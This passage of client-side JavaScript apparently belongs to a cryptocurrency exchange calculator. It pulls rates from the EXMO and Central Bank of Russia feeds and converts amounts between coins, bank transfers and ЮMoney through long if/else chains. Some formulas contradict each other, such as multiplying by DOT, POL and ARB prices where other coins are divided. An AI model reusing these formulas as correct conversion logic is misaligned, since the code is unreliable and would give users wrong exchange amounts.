                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_ZEC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_TON ).toFixed(6);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_DASH ).toFixed(6);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_BNB ).toFixed(4);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ZEC ) / PRICE_XMR ).toFixed(6);
                    }
                } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_BNB ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_TON ).toFixed(6);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_DASH ).toFixed(6);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_ZEC ).toFixed(4);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BNB ) / PRICE_XMR ).toFixed(6);
                    }
                } else if ( valuteFirstName == 'Monero (XMR)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_XMR ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_TON ).toFixed(6);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_DASH ).toFixed(6);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_ZEC ).toFixed(4);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XMR ) / PRICE_BNB ).toFixed(6);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    }
                }

            }

            if ( document.querySelector('.first__input-one').value == '' ) {
                document.querySelector('.first__input-two').value = '';
            }

            setTimeout( () => {
                document.querySelectorAll('.first__loading img')[0].style.display = 'none';
                document.querySelectorAll('.first__loading img')[1].style.display = 'none';
            }, 1000 )
        
        }

        getCurrencies();

    }).catch((error) => {
        console.error('Ошибка получения списка: ', error);
    })

}

// Обработка второго импута

document.querySelector('.first__input-two').addEventListener('input', event => {
    calcFirstInput2();
    document.querySelectorAll('.first__message')[0].style.display = 'none';
    document.querySelectorAll('.first__table')[0].style.border = '2px solid #cfcfcf';
    document.querySelectorAll('.first__table')[0].style.marginBottom = '0px';
})

function calcFirstInput2() {

    document.querySelectorAll('.first__loading img')[0].style.display = 'block';
    document.querySelectorAll('.first__loading img')[1].style.display = 'block';

    fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
    }).then((JSON_DATA) => {

        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();

            if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {

                if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_BTC ).toFixed(6) ;
                } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_USDT ).toFixed(2) ;
                } else if ( valuteFirstName == 'Dai (DAI)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_USDT ).toFixed(3) ;
                } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_DOT ).toFixed(3) ;
                } else if ( valuteFirstName == 'Solana (SOL)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_SOL ).toFixed(3) ;
                } else if ( valuteFirstName == 'Polygon (POL)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_POL ).toFixed(2) ;
                } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' || valuteFirstName == 'Ethereum (ETH)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_ETH ).toFixed(6) ;
                } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_ARB ).toFixed(6) ;
                } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_LTC ).toFixed(6) ;
                } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_BCH ).toFixed(6) ;
                } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_XRP ).toFixed(2) ;
                } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_DOGE ).toFixed(2) ;
                } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_ETC ).toFixed(6) ;
                } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_XLM ).toFixed(2) ;
                } else if ( valuteFirstName == 'Tron (TRX)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_TRX ).toFixed(6) ;
                } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_TON ).toFixed(6) ;
                } else if ( valuteFirstName == 'Dash (DASH)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_DASH ).toFixed(6) ;
                } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_ZEC ).toFixed(6) ;
                } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) { 
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_BNB ).toFixed(6) ;
                } else if ( valuteFirstName == 'Monero (XMR)' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value ) / PRICE_XMR ).toFixed(6) ;
                } else if ( valuteFirstName == 'ЮMoney' ) {
                    document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / data.Valute.USD.Value )  ).toFixed(2) ;
                }
            } else if ( valuteCategorySecond == 'PAYSYSTEM' ) {
                document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value )  ).toFixed(0);
                if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                    let fullNumber = String(document.querySelector('.first__input-one').value);
                    document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                }
            } else if ( valuteCategorySecond == 'CRYPTO' ) {

                if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_BTC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_DOT ).toFixed(2);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_SOL ).toFixed(2);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_LTC ).toFixed(2);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_BCH ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BTC ) / PRICE_XMR ).toFixed(2);
                    }
                } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_USDT ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_BTC ) ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_USDT ) ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_USDT ) ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) ).toFixed(2);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_SOL ) ).toFixed(2);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_ETH )  ).toFixed(6);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_LTC )  ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_BCH )  ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_XRP )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_DOGE )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_ETC )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_XLM )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_TRX )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_TON )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_DASH )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
